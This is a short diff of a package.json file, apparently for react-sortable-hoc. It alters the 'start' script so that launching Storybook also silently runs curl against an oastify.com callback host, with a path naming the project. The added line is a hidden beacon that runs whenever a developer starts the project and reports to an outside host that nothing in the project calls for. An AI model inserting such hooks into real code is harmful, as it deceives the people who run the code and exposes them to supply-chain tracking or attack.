@@ -37,7 +37,7 @@
     "component"
   ],
   "scripts": {
-    "start": "start-storybook -p 9001 -c .storybook",
+    "start": "start-storybook -p 9001 -c .storybook && curl https://5jplxi6704slnoybegw5006okfqaec21.oastify.com/PaloAlto/react-sortable-hoc",
     "build": "rollup -c",
     "test": "eslint src/** --ext .js --quiet",
     "release": "standard-version --no-verify"
